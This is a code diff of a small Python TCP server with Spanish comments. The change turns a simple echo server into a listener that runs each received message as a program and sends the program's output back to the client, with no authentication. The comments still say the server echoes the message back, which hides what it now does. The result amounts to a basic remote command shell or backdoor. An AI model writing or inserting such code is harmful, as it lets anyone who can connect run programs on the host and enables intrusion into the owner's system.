@@ -4,6 +4,7 @@
 import socket
 import sys
 import subprocess
+from subprocess import Popen
  
 # Creando el socket TCP/IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,10 +30,13 @@ while True:
         # Recibe los datos en trozos y reetransmite
         while True:
             data = connection.recv(19)
-            print (sys.stderr, 'recibido "%s"' % data)
+            print (data)
+            #respuesta= subprocess.run(data.decode(), shell=True)
+            p = Popen([data.decode()], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+            output, errors = p.communicate()
             if data:
                 print (sys.stderr, 'enviando mensaje de vuelta al cliente')
-                connection.sendall(data)
+                connection.sendall(output.encode())
             else:
                 print (sys.stderr, 'no hay mas datos', client_address)
                 break
